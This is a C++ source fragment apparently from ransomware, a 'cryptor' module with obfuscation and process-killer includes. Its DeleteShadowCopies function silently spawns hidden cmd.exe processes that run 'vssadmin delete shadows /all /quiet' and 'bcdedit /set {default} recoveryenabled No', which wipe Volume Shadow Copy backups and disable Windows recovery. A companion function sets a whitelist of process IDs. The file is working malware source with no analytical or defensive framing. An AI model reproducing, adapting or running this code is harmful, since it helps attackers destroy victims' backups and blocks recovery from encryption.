#include "common.h"
#include "api/getapi.h"
#include "obfuscation/MetaString.h"
#include "cryptor.h"

// ORIGINAL

STATIC process_killer::PPID_LIST g_WhiteListPids = NULL;

VOID cryptor::SetWhiteListProcess(process_killer::PPID_LIST PidList)
{
	g_WhiteListPids = PidList;
}

VOID cryptor::DeleteShadowCopies(INT Flags)
{
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	RtlSecureZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	RtlSecureZeroMemory(&pi, sizeof(pi));

	WCHAR cmdVss[] = L"cmd.exe /c vssadmin delete shadows /all /quiet";

	if (pCreateProcessW(NULL, cmdVss, NULL, NULL, FALSE,
		CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{
		pWaitForSingleObject(pi.hProcess, 30000);
		pCloseHandle(pi.hProcess);
		pCloseHandle(pi.hThread);
	}

	RtlSecureZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	RtlSecureZeroMemory(&pi, sizeof(pi));

	WCHAR cmdBcdedit[] = L"cmd.exe /c bcdedit /set {default} recoveryenabled No";

	if (pCreateProcessW(NULL, cmdBcdedit, NULL, NULL, FALSE,
		CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{
		pWaitForSingleObject(pi.hProcess, 30000);
		pCloseHandle(pi.hProcess);
		pCloseHandle(pi.hThread);
	}
}
